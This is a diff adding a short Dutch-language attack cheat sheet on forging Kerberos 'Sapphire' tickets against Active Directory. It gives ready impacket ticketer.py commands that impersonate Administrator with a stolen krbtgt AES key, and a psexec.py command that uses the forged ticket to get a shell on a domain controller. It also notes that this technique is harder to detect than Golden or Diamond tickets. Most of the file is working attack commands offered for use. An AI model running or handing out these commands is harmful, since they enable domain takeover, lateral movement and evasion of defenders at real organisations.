@@ -1,0 +1,29 @@
+# Sapphire Ticket — Meest stealthy ticket forgery
+# Combineert S4U2Self met ticket modification voor een TGT met echte PAC
+# Moeilijker te detecteren dan Golden of Diamond tickets
+#
+# === Vereisten ===
+# - krbtgt AES key (via DCSync)
+# - Domain user credentials (voor S4U2Self)
+#
+# === Voorbeelden ===
+
+# impacket ticketer - Sapphire ticket aanmaken
+python3 ticketer.py -request -impersonate Administrator -domain DOMAIN -domain-sid DOMAIN_SID -aesKey KRBTGT_AES256 -user-id 500 -groups 512 sapphire_admin
+
+# Met specifiek target SPN
+python3 ticketer.py -request -impersonate Administrator -domain DOMAIN -domain-sid DOMAIN_SID -aesKey KRBTGT_AES256 -spn cifs/DC_FQDN sapphire_admin
+
+# Gebruik het ticket
+export KRB5CCNAME=sapphire_admin.ccache
+python3 psexec.py -k -no-pass DOMAIN/Administrator@DC_FQDN
+
+# Verschil met Golden/Diamond:
+# Golden Ticket: Volledig vervalst TGT + PAC (geen 4768 event, offline)
+# Diamond Ticket: Echt TGT met gemodificeerde PAC (4768 event, realtime)
+# Sapphire Ticket: S4U2Self TGT met echte PAC data (legitiem S4U verkeer)
+
+# Noot: Sapphire tickets gebruiken S4U2Self om een echte PAC op te halen
+# Noot: Het PAC wordt dan in een vervalst TGT geplaatst
+# Noot: Detectie is zeer moeilijk omdat alle PAC data authentiek is
+# Noot: Vereist dezelfde krbtgt key als Golden/Diamond tickets
